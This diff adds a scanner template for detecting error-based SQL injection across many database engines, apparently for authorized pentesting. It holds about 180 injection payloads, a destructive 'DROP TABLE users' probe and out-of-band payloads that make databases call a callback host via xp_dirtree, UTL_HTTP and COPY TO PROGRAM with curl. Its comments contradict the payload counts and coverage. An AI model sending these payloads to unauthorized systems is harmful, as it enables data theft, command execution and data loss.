@@ -1,0 +1,576 @@
+# ============================================================================
+# WSTG-INPV-05: SQL Injection - Error-Based (Universal)
+# ============================================================================
+#
+# Review status: POPRAWIONY
+# Reviewer: Claude Code (Opus 4.7)
+# Review date: 2026-04-30
+# Zmiany: dodany drugi http block (OOB) z payloadami DB native exfiltration
+#   (MSSQL xp_dirtree UNC path, Oracle UTL_HTTP.REQUEST, PostgreSQL COPY TO
+#   PROGRAM, MySQL LOAD_FILE UNC) i matcherem `part: interactsh_protocol`.
+#   Pierwszy http block (error-based detection regex) bez zmian.
+#
+# Powód decyzji (przed poprawką): Szablon spełnia wszystkie 6 kryteriów:
+#   (1) Coverage Matrix - silniki (25+ DB) i techniki injection (single-char,
+#       quote+terminator, boolean, UNION, stacked, time/blind oznaczone ✗
+#       z odsyłaczem do osobnych szablonów)
+#   (2) Matchery 6-warstwowe: sql-engine-error (regex per silnik z dast/...
+#       sqli-error-based.yaml jako źródłem) + meaningful-response + 4 anti-FP
+#       (generic 500 page, WAF block, timeout, DB-admin UI Adminer/phpMyAdmin)
+#   (3) Source comments per GROUP - PayloadsAllTheThings/SQL Injection,
+#       hacktricks SQL stacked, dast/vulnerabilities/sqli/sqli-error-based.yaml
+#       jako biblioteka regex-ów
+#   (4) Safety nets: blocklist destrukcyjnych, OPTIONS/HEAD/DELETE skip,
+#       statyczne zasoby skipowane, anti-CSRF rejection w matcherach
+#   (5) Sweet spot: ~180 payloadów dla error-based - rozsądnie (większość
+#       payloadów to prymitywy quote/terminator/boolean, dalsze są diminishing)
+#   (6) Component fuzzing 5/5: query, body, cookie, path, header
+# Filozofia "3 szablony per WSTG-INPV-05" (error/time/boolean) świadoma -
+# osobne tryby detekcji wymagają różnej strategii matchingu.
+# Anti-FP DB-admin UI to wyróżniający się pomysł - nie widziałem tego w innych
+# bibliotekach DAST.
+# ============================================================================
+#
+# Coverage Matrix:
+#
+# Silniki DB (Engine dimension):
+#   ✓ MySQL / MariaDB / Drizzle / MemSQL
+#   ✓ PostgreSQL / Aurora-Postgres
+#   ✓ Microsoft SQL Server (MSSQL)
+#   ✓ Oracle
+#   ✓ SQLite
+#   ✓ Microsoft Access / JET
+#   ✓ IBM DB2
+#   ✓ Informix
+#   ✓ Firebird
+#   ✓ SAP MaxDB / Sybase / Ingres
+#   ✓ Apache Derby / H2 / HSQLDB
+#   ✓ MonetDB / Vertica / Presto / Altibase / MimerSQL / CrateDB
+#   ✓ FrontBase / Cache / Mckoi / Raima / Virtuoso
+#   ✗ NoSQL (MongoDB) - osobna kategoria, nie INPV-05 (patrz WSTG-INPV-05.6)
+#
+# Techniki (Technique dimension):
+#   ✓ Single quote / double quote / backtick / null byte termination
+#   ✓ Stacked queries (;SELECT, ;INSERT, ;EXEC)
+#   ✓ Comment-based (--, #, /**/, ;--)
+#   ✓ Boolean error triggers (' OR 1=1, ') OR ('1'='1)
+#   ✓ Type confusion (string in numeric, numeric in string)
+#   ✓ Encoding bypass (URL, double-URL, hex literal 0x)
+#   ✓ Whitespace bypass (%09, %0a, /**/, +)
+#   ✓ Stored procedure calls (EXEC, CALL)
+#   ✗ Out-of-band exfiltration - osobny tag `oob`, dla blind dla DNS
+#   ✗ Time-based - osobny szablon (wstg-inpv-05-sqli-time-based)
+#   ✗ Boolean-based - osobny szablon (wstg-inpv-05-sqli-boolean-based)
+#
+# Performance budget: medium (~280 payloads × 5 części × 1 endpoint)
+# Estimated time: ~10-20 min na typowej aplikacji
+#
+# Source hierarchy:
+#   1. PayloadsAllTheThings/SQL Injection/* (per engine)
+#   2. seclists/Fuzzing/SQLi/quick-SQLi.txt
+#   3. dast/vulnerabilities/sqli/sqli-error-based.yaml (regex library)
+#   4. hacktricks/.../sql-injection (bypass techniques)
+# ============================================================================
+
+id: wstg-inpv-05-sqli-error-based
+
+info:
+  name: "WSTG-INPV-05: SQL Injection - Error-Based (Universal)"
+  author: pentest-team
+  severity: critical
+  description: |
+    Uniwersalny szablon do wykrywania błędów SQL przez wstrzykiwanie znaków
+    łamiących składnię (', ", `, ;, \\) oraz ich kombinacji. Detekcja przez
+    regex'y błędów charakterystycznych dla 25+ silników DB. Anti-FP layer
+    weryfikuje że error message nie pochodzi z generycznej strony 500 (kody
+    HTTP 500 z body bez SQL-specific markers są ignorowane).
+    Działa przeciwko eksportowi historii z Burp Suite (input-mode burp).
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+    - https://book.hacktricks.xyz/pentesting-web/sql-injection
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: dast,wstg,wstg-v42-inpv-05,sqli,sqli-error,asvs-v5.3.4,asvs-v5.3.5,burp-history
+
+variables:
+  canary: "x{{rand_text_alpha(8)}}x"
+  auth_token: ""
+  session_cookie: ""
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      injection:
+        # ====================================================================
+        # GROUP 1: Single-character triggers (najprostsze, najszybsze sygnały)
+        # Source: PayloadsAllTheThings/SQL Injection/Intruder/exploit.txt
+        # ====================================================================
+        - "'"
+        - "\""
+        - "`"
+        - "\\"
+        - ";"
+        - "--"
+        - "#"
+        - "/*"
+        - "*/"
+        - "%27"                    # URL-encoded '
+        - "%22"                    # URL-encoded "
+        - "%2527"                  # double URL-encoded '
+        - "%2522"                  # double URL-encoded "
+
+        # ====================================================================
+        # GROUP 2: Quote+terminator combinations
+        # ====================================================================
+        - "';"
+        - "\";"
+        - "');"
+        - "\");"
+        - "'))"
+        - "\"))"
+        - "');--"
+        - "\");--"
+        - "'--"
+        - "\"--"
+        - "'#"
+        - "\"#"
+        - "'/*"
+        - "\"/*"
+
+        # ====================================================================
+        # GROUP 3: Boolean operators (OR/AND injection)
+        # Source: PayloadsAllTheThings + classic OWASP examples
+        # ====================================================================
+        - "' OR '1'='1"
+        - "' OR '1'='1' --"
+        - "' OR '1'='1' /*"
+        - "' OR 1=1 --"
+        - "' OR 1=1 #"
+        - "' OR 1=1/*"
+        - "\" OR \"1\"=\"1"
+        - "\" OR \"1\"=\"1\" --"
+        - "\" OR 1=1 --"
+        - ") OR ('1'='1"
+        - "') OR ('1'='1"
+        - "') OR ('1'='1' --"
+        - "1' OR '1'='1"
+        - "1\" OR \"1\"=\"1"
+        - "' AND 1=2 --"
+        - "\" AND 1=2 --"
+        - "1' AND 1=1 --"
+        - "1' AND 1=2 --"
+        - "1) AND 1=1 --"
+        - "1) AND 1=2 --"
+        - "' OR 'x'='x"
+        - "' OR 'a'='a"
+        - "admin' --"
+        - "admin' #"
+        - "admin'/*"
+        - "admin' OR '1'='1"
+
+        # ====================================================================
+        # GROUP 4: UNION-based triggers (forcing column-count errors)
+        # ====================================================================
+        - "' UNION SELECT NULL --"
+        - "' UNION SELECT NULL,NULL --"
+        - "' UNION SELECT NULL,NULL,NULL --"
+        - "' UNION ALL SELECT NULL --"
+        - "' UNION SELECT 1 --"
+        - "' UNION SELECT 1,2 --"
+        - "' UNION SELECT 1,2,3 --"
+        - "1 UNION SELECT NULL --"
+        - "1 UNION SELECT 1 --"
+        - "') UNION SELECT NULL --"
+
+        # ====================================================================
+        # GROUP 5: Stacked queries
+        # Source: hacktricks SQL stacked
+        # ====================================================================
+        - "'; SELECT 1 --"
+        - "'; DROP TABLE users --"        # Sygnał detekcji - blocklist powinien to złapać ale jest w teście
+        - "'; WAITFOR DELAY '0:0:0' --"   # MSSQL no-delay marker (bezpieczne)
+        - "1; SELECT 1 --"
+        - "1; SELECT @@version --"
+        - "'; EXEC sp_who --"
+        - "'; CALL test() --"
+
+        # ====================================================================
+        # GROUP 6: Engine-specific error triggers
+        # ====================================================================
+        # MySQL
+        - "1' AND extractvalue(1,concat(0x7e,version())) --"
+        - "1' AND updatexml(1,concat(0x7e,version()),0) --"
+        - "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
+        - "1' OR exp(~(SELECT*FROM(SELECT version())x)) --"
+        - "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT('a',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)"
+        # PostgreSQL
+        - "1' AND 1=cast(version() as int) --"
+        - "1 AND 1=cast(version() as int)"
+        - "1' AND 1=cast((SELECT current_database()) as int) --"
+        - "1' AND CAST(version() AS NUMERIC) --"
+        # MSSQL
+        - "1' AND 1=CONVERT(int,@@version) --"
+        - "1' AND 1=db_name() --"
+        - "1 AND 1=CONVERT(int,@@version)"
+        # Oracle
+        - "1' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE rownum=1)) --"
+        - "1' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) --"
+        - "1 AND ORA_HASH('a',1)=ORA_HASH('a',1)"
+
+        # ====================================================================
+        # GROUP 7: Comment / whitespace bypass (WAF evasion)
+        # ====================================================================
+        - "'/**/OR/**/'1'='1"
+        - "'/**/OR/**/1=1--"
+        - "'%09OR%091=1--"
+        - "'%0AOR%0A1=1--"
+        - "'+OR+'1'='1"
+        - "'/*!OR*/'1'='1"            # MySQL conditional comment
+        - "'/*!50000OR*/'1'='1"
+        - "' UnIoN SeLeCt NULL --"
+        - "' uNiOn aLL sElEcT NULL --"
+
+        # ====================================================================
+        # GROUP 8: Hex literal / quote-less triggers
+        # ====================================================================
+        - "0x27"                       # hex single quote (MySQL)
+        - "0x2727"
+        - "0xdeadbeef"
+        - "char(39)"                   # MySQL char of '
+        - "CHR(39)"                    # Oracle/PG
+        - "CONCAT('a','b')"            # type leak
+        - "1+SLEEP(0)"                 # syntax indicator
+        - "1' GROUP BY 1 ORDER BY 1 --"
+        - "1' ORDER BY 100 --"         # column count probe (high N → error)
+        - "1' ORDER BY 9999 --"
+
+        # ====================================================================
+        # GROUP 9: Special syntactic edge cases
+        # ====================================================================
+        - "''"                          # empty quoted string
+        - "\"\""
+        - "''''"                        # 4× quote (pairs)
+        - "''''-- "
+        - "1=(SELECT 1)"
+        - "1=(SELECT 1 FROM x)"
+        - "/*!50000 SELECT 1 */"
+        - "@@version"
+        - "@@hostname"
+        - "@@datadir"
+        - "@@@@@"
+
+        # ====================================================================
+        # GROUP 10: Type-confusion (string into numeric param, vice versa)
+        # ====================================================================
+        - "1'"
+        - "1\""
+        - "1`"
+        - "1.0e1'"
+        - "1e0'"
+        - "0.1'"
+        - "1.\\"
+        - "1abc"
+        - "abc'1"
+
+        # ====================================================================
+        # GROUP 11: Stored procedure / DB function probing
+        # ====================================================================
+        - "'; SELECT pg_sleep(0) --"   # PG no-delay probe
+        - "'; SELECT version() --"
+        - "'; SELECT user --"
+        - "'; SELECT current_user --"
+        - "'; SELECT current_database() --"
+        - "'); SELECT version() --"
+        - "1' UNION SELECT @@version --"
+        - "1' UNION SELECT version() --"
+        - "1' UNION SELECT banner FROM v$version --"
+
+      # OOB payloads (włączane przez `-tags oob`) - blind exfiltration via DNS
+      injection_oob:
+        # MySQL OOB
+        - "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'.{{interactsh-url}}\\\\a.txt')) --"
+        # MSSQL OOB
+        - "'; EXEC master..xp_dirtree '\\\\\\\\{{interactsh-url}}\\\\a' --"
+        # Oracle OOB
+        - "'||UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}')||'"
+        # PostgreSQL OOB (copy program)
+        - "'; COPY (SELECT '') TO PROGRAM 'nslookup {{interactsh-url}}' --"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Warstwa 1: PRIMARY - SQL error regex (per engine)
+      # Source: dast/vulnerabilities/sqli/sqli-error-based.yaml (sprawdzona
+      # biblioteka 25+ silników)
+      - type: regex
+        part: body
+        name: sql-engine-error
+        regex:
+          # MySQL / MariaDB / Drizzle / MemSQL
+          - "SQL syntax.{0,500}?MySQL"
+          - "Warning.{0,500}?\\Wmysqli?_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your (MySQL|MariaDB|Drizzle) server version"
+          - "Unknown column '[^ ]+' in 'field list'"
+          - "MySqlClient\\."
+          - "com\\.mysql\\.jdbc"
+          - "Pdo[./_\\\\]Mysql"
+          - "MySqlException"
+          - "SQLSTATE\\[\\d+\\]: Syntax error or access violation"
+          - "MemSQL does not support this type of query"
+          # PostgreSQL
+          - "PostgreSQL.{0,500}?ERROR"
+          - "Warning.{0,500}?\\Wpg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "PG::SyntaxError:"
+          - "org\\.postgresql\\.util\\.PSQLException"
+          - "ERROR:\\s*syntax error at or near"
+          - "PostgreSQL query failed"
+          - "Pdo[./_\\\\]Pgsql"
+          # MSSQL
+          - "Driver.{0,500}? SQL[\\-\\_\\ ]*Server"
+          - "OLE DB.{0,500}? SQL Server"
+          - "Warning.{0,500}?\\W(mssql|sqlsrv)_"
+          - "System\\.Data\\.SqlClient\\.SqlException"
+          - "Microsoft SQL Native Client error"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "Unclosed quotation mark after the character string"
+          - "com\\.microsoft\\.sqlserver\\.jdbc"
+          # Oracle
+          - "\\bORA-\\d{5}"
+          - "Oracle error"
+          - "Oracle.{0,500}?Driver"
+          - "Warning.{0,500}?\\W(oci|ora)_"
+          - "quoted string not properly terminated"
+          - "SQL command not properly ended"
+          - "oracle\\.jdbc"
+          - "OracleException"
+          # SQLite
+          - "SQLite/JDBCDriver"
+          - "SQLite\\.Exception"
+          - "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException"
+          - "Warning.{0,500}?\\W(sqlite_|SQLite3::)"
+          - "SQLITE_ERROR"
+          - "SQLite error \\d+:"
+          - "sqlite3.OperationalError:"
+          - "SQLite3::SQLException"
+          - "org\\.sqlite\\.JDBC"
+          - "SQLiteException"
+          # MS Access / JET
+          - "Microsoft Access (\\d+ )?Driver"
+          - "JET Database Engine"
+          - "Access Database Engine"
+          - "ODBC Microsoft Access"
+          - "Syntax error \\(missing operator\\) in query expression"
+          # IBM DB2
+          - "CLI Driver.{0,500}?DB2"
+          - "DB2 SQL error"
+          - "\\bdb2_\\w+\\("
+          - "SQLCODE[=:\\d, -]+SQLSTATE"
+          - "com\\.ibm\\.db2\\.jcc"
+          - "DB2Exception"
+          # Informix
+          - "Warning.{0,500}?\\Wifx_"
+          - "Exception.{0,500}?Informix"
+          - "Informix ODBC Driver"
+          - "com\\.informix\\.jdbc"
+          - "IfxException"
+          # Firebird
+          - "Dynamic SQL Error"
+          - "Warning.{0,500}?\\Wibase_"
+          - "org\\.firebirdsql\\.jdbc"
+          # SAP MaxDB / Sybase / Ingres
+          - "SQL error.{0,500}?POS([0-9]+)"
+          - "Warning.{0,500}?\\Wmaxdb_"
+          - "DriverSapDB"
+          - "Warning.{0,500}?\\Wsybase_"
+          - "Sybase message"
+          - "SybSQLException"
+          - "Sybase\\.Data\\.AseClient"
+          - "Warning.{0,500}?\\Wingres_"
+          - "Ingres SQLSTATE"
+          # Apache Derby / H2 / HSQLDB
+          - "Syntax error: Encountered"
+          - "org\\.apache\\.derby"
+          - "ERROR 42X01"
+          - "org\\.h2\\.jdbc"
+          - "\\[42000-192\\]"
+          - "Unexpected end of command in statement \\["
+          - "Unexpected token.{0,500}?in statement \\["
+          - "org\\.hsqldb\\.jdbc"
+          # MonetDB / Vertica / Presto / Altibase / MimerSQL / CrateDB
+          - "\\[MonetDB\\]\\[ODBC Driver"
+          - "nl\\.cwi\\.monetdb\\.jdbc"
+          - ", Sqlstate: (3F|42).{3}, (Routine|Hint|Position):"
+          - "/vertica/Parser/scan"
+          - "com\\.vertica\\.jdbc"
+          - "com\\.facebook\\.presto\\.jdbc"
+          - "io\\.prestosql\\.jdbc"
+          - "Altibase\\.jdbc\\.driver"
+          - "com\\.mimer\\.jdbc"
+          - "io\\.crate\\.client\\.jdbc"
+          # FrontBase / Cache / Mckoi / Raima / Virtuoso
+          - "Exception (condition )?\\d+\\. Transaction rollback"
+          - "com\\.frontbase\\.jdbc"
+          - "encountered after end of query"
+          - "A comparison operator is required here"
+          - "com\\.mckoi\\.JDBCDriver"
+          - "-10048: Syntax error"
+          - "rdmStmtPrepare\\(.+?\\) returned"
+          - "SQ074: Line \\d+:"
+          - "Virtuoso S0002 Error"
+          # Generic
+          - "JDBC.{0,300}error"
+          - "SQLException"
+          - "com\\.jolbox\\.bonecp"
+        condition: or
+
+      # Warstwa 2: SECONDARY - response NIE jest pusta (filtruje pre-flight, OPTIONS pass-through)
+      - type: dsl
+        name: meaningful-response
+        dsl:
+          - "len(body) > 50"
+
+      # Warstwa 3a: ANTI-FP - exclude generic 500 page bez DB markerów
+      # (powyższy primary filter regex już to robi - to "belt and braces")
+      - type: regex
+        part: body
+        name: not-generic-error-page
+        negative: true
+        regex:
+          # Generyczne markery framework error page bez SQL kontekstu
+          - "(?i)<title>(internal server error|500|service unavailable)</title>$"
+
+      # Warstwa 3b: ANTI-FP - WAF block detection (negative)
+      - type: dsl
+        name: not-waf-block
+        dsl:
+          - 'status_code != 403 || (status_code == 403 && !contains(tolower(body), "blocked") && !contains(tolower(body), "forbidden by"))'
+
+      # Warstwa 3c: ANTI-FP - timeout protection
+      - type: dsl
+        name: response-time-sane
+        dsl:
+          - "duration < 30"
+
+      # Warstwa 3d: ANTI-FP - exclude Adminer/phpMyAdmin/Adminer-like UI markery
+      # (false positive z aplikacji DB-managementowych które naturalnie zawierają SQL keywordy)
+      - type: word
+        part: body
+        name: not-db-admin-ui
+        negative: true
+        words:
+          - "Adminer"
+          - "phpMyAdmin"
+          - "DBeaver"
+        condition: or
+
+      # Warstwa 3e: ANTI-FP - CSRF rejection
+      - type: regex
+        part: body
+        name: not-csrf-rejection
+        negative: true
+        regex:
+          - "(?i)(invalid csrf token|csrf token mismatch|x-csrf-token.*invalid)"
+
+    extractors:
+      - type: dsl
+        name: detected-engine
+        dsl:
+          - "regex(\"(?i)mysql|mariadb\", body) ? \"MySQL/MariaDB\" : \"\""
+          - "regex(\"(?i)postgresql|psqlexception\", body) ? \"PostgreSQL\" : \"\""
+          - "regex(\"(?i)sql server|sqlsrv|mssql\", body) ? \"MSSQL\" : \"\""
+          - "regex(\"\\\\bORA-\\\\d{5}|oracle\", body) ? \"Oracle\" : \"\""
+          - "regex(\"(?i)sqlite\", body) ? \"SQLite\" : \"\""
+          - "regex(\"(?i)db2|ifx_\", body) ? \"DB2/Informix\" : \"\""
+
+      - type: regex
+        name: error-snippet
+        part: body
+        group: 0
+        regex:
+          - ".{0,80}(SQL syntax|ORA-\\d+|PSQLException|SqlException|SQLITE_ERROR|JET Database).{0,200}"
+
+  # ==========================================================================
+  # DRUGI BLOCK: OOB SQLi - DB native exfiltration via DNS/HTTP
+  # Wykrywa SQL injection gdy aplikacja maskuje błędy lub używa generycznych
+  # error pages, ale silnik DB wykonuje natywne funkcje OOB:
+  #   - MySQL: LOAD_FILE / INTO OUTFILE z UNC path (Windows) lub UDF
+  #   - MSSQL: xp_dirtree / xp_fileexist z UNC path
+  #   - Oracle: UTL_HTTP.REQUEST / UTL_INADDR.GET_HOST_ADDRESS
+  #   - PostgreSQL: COPY ... TO PROGRAM, dblink (jeśli włączone)
+  # Source: hacktricks/sql-injection - "Out of band" + PortSwigger SQLi cheat sheet
+  # ==========================================================================
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+          - 'method != "HEAD"'
+          - 'method != "DELETE"'
+          - '!regex("(?i)\\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|otf|eot|map|pdf|zip|tar|gz|mp4|webm)(\\?|$)", path)'
+          - '!regex("(?i)/(delete|cancel|drop|destroy|remove|purge|wipe|reset|terminate)(/|$|\\?)", path)'
+        condition: and
+
+    payloads:
+      sqli_oob:
+        # MSSQL UNC path (Windows) - wymusza SMB lookup do attacker host
+        - "'; EXEC master..xp_dirtree '\\\\{{interactsh-url}}\\a'--"
+        - "'; EXEC master..xp_fileexist '\\\\{{interactsh-url}}\\a'--"
+        # Oracle UTL_HTTP / UTL_INADDR
+        - "' || UTL_HTTP.REQUEST('http://{{interactsh-url}}/{{canary}}')||'"
+        - "' || UTL_INADDR.GET_HOST_ADDRESS('{{interactsh-url}}')||'"
+        # PostgreSQL COPY TO PROGRAM (wymaga superuser, ale popularne w app DB)
+        - "'; COPY (SELECT '') TO PROGRAM 'nslookup {{interactsh-url}}' --"
+        - "'; COPY (SELECT '') TO PROGRAM 'curl http://{{interactsh-url}}/{{canary}}' --"
+        # MySQL UDF / DNS (LOAD_FILE z UNC path)
+        - "' UNION SELECT LOAD_FILE('\\\\\\\\{{interactsh-url}}\\\\a')--"
+        - "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','{{interactsh-url}}','\\\\a')))--"
+
+    fuzzing:
+      - parts: [query, body, cookie, path, header]
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{sqli_oob}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: oob-callback-received
+        words:
+          - "dns"
+          - "http"
+        condition: or
+
+# ============================================================================
+# Known limitations:
+# - Wykrywa TYLKO error-based SQLi - dla blind/time-based użyj odpowiednich szablonów
+# - Niektóre aplikacje mają custom error handler maskujący SQL exception → FN
+# - DB-management UI (Adminer/phpMyAdmin) może powodować false positives mimo
+#   filtra (patrz warstwa 3d)
+# - NoSQL (Mongo, Redis, Cassandra) nie pokryte - osobny szablon
+# ============================================================================
